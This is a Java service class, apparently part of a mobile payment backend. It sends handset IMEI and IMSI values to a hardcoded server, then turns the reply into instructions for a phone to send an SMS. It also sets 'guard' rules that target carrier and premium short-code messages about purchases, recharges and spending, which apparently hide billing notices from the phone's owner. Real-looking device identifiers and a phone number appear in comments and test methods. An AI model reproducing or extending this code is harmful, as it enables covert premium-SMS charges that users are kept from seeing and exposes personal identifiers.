package com.jxt.pay.appclient.service.dynamic.net;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.apache.log4j.Logger;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;

/**
 * {"zzid":"10038","os":"Android","model":"N625","phoneNumber":"14787311060","productid":"10007","isroot":"0","clientver":"1.0","city":"深圳","imei":"860075020968377","osver":"android 2.3.3","imsi":"460008627015483"}
 * @author leoliu
 *
 */
public class Ffkj1DynamicService implements IDynamicService{
	
	private static Logger logger = Logger.getLogger(Ffkj1DynamicService.class);

	private static final String TYPE = "ffkj1";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "{\"zzid\":\"{zzid}\",\"os\":\"Android\",\"model\":\"N625\",\"phoneNumber\":\"{imsi}\",\"productid\":\"{productid}\",\"isroot\":\"0\",\"clientver\":\"1.0\",\"imei\":\"{imei}\",\"osver\":\"android 2.3.3\",\"orderid\":\"\",\"imsi\":\"{imsi}\"}";
	
	private static final Guard guard1 = new Guard("10658800","成功购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String zzid = map.get("zzid");
			String productid = map.get("productid");
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			
			String pstr = REQUESTMODEL.replace("{zzid}",zzid).replace("{productid}",productid).replace("{imei}",imei).replace("{imsi}",imsi);
			
			logger.info("pstr:"+pstr);
			
			String responseTxt = null;
			
			{
				HttpPost post=new HttpPost(url);
				List<NameValuePair> paramList = new ArrayList<NameValuePair>();
				String enString=pstr;
				
				BasicNameValuePair param = new BasicNameValuePair(enString,null); 
				paramList.add(param);
				try {
					post.setEntity(new StringEntity(param.toString()));
					HttpClient client=new DefaultHttpClient();
					HttpResponse response;
					response = client.execute(post);
					int responseStatus = response.getStatusLine().getStatusCode();
					if (HttpStatus.SC_OK==responseStatus) {
						responseTxt = EntityUtils.toString(response.getEntity());
						System.out.println("responseTxt:"+responseTxt);
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
			
			xml = parseTxt(responseTxt);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parseTxt(String responseTxt){
		
		if(responseTxt != null && responseTxt.length() > 0){
			String[] arr = responseTxt.split(",");
			if(arr.length == 2){
				List<Sms> smsList = new ArrayList<Sms>();
				
				Sms sms = new Sms();
				
				sms.setSmsContent(arr[1].replace("\r\n",""));
				sms.setSmsDest(arr[0]);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				smsList.add(sms);
				
				Sms guardSms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard1);
				guardList.add(guard2);
				
				guardList.add(guard3);
				guardList.add(guard4);
				
				guardSms.setGuardList(guardList);
				
				smsList.add(0, guardSms);
					
				return XstreamHelper.toXml(smsList);
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		
		test2();
		
//		test3();
	}
	
	private static void test2(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://42.51.10.148:8080/admin/c0/info.aspx");
		map.put("imsi", "460022101441340");
		map.put("imei", "862949029214504");
		map.put("zzid", "10123");
		map.put("productid", "10");
		map.put("type", "ffkj1");
		map.put("channel", "10B201a123456788");
		
		System.out.println(new Ffkj1DynamicService().dynamic(map));
	}
	
	private static void test3(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://42.51.10.148:8080/admin/c0/info.aspx");
		map.put("imsi", "460022101441340");
		map.put("imei", "862949029214504");
		map.put("zzid", "10124");
		map.put("productid", "8");
		map.put("type", "ffkj1");
		map.put("channel", "10B201a123456788");
		
		System.out.println(new Ffkj1DynamicService().dynamic(map));
	}
	
	
	private static void test1(){
		String zzid="10124";
		String phonenumber="460028174282753";
		String imei="869460011612203";
		String orderid="";
		String imsi="460028174282753";
		String productid = "8";
		
		final String pstr="{\"zzid\":\""+zzid+"\",\"os\":\"Android\",\"model\":\"N625\",\"phoneNumber\":\""+phonenumber+"\",\"productid\":\""+productid+"\",\"isroot\":\"0\",\"clientver\":\"1.0\",\"imei\":\""+imei+"\",\"osver\":\"android 2.3.3\",\"orderid\":\"\",\"imsi\":\""+imsi+"\"}";
		
//		final String pstr="{\"zzid\":\"10115\",\"os\":\"Android\",\"model\":\"N625\",\"phoneNumber\":\"15817431781\",\"productid\":\"10007\",\"isroot\":\"0\",\"clientver\":\"1.0\",\"city\":\"深圳\",\"imei\":\"860075020968377\",\"osver\":\"android 2.3.3\",\"imsi\":\"460008627015484\"}";
		
	    String url="http://42.51.10.148:8080/admin/c0/info.aspx";
	    HttpPost post=new HttpPost(url);
		List<NameValuePair> paramList = new ArrayList<NameValuePair>();
		String enString=pstr;
		
		BasicNameValuePair param = new BasicNameValuePair(enString,null); 
		paramList.add(param);
		try {
			post.setEntity(new StringEntity(param.toString()));
			HttpClient client=new DefaultHttpClient();
			HttpResponse response;
			response = client.execute(post);
			int responseStatus = response.getStatusLine().getStatusCode();
			if (HttpStatus.SC_OK==responseStatus) {
				String strResult = EntityUtils.toString(response.getEntity());
				
				System.out.println("result : "+responseStatus+" ; "+strResult.replace("\r\n","")+"--");
			}else{
				System.out.println("result : "+responseStatus);
			}
		} catch (Exception e) {
			e.printStackTrace();
		};
	}

}
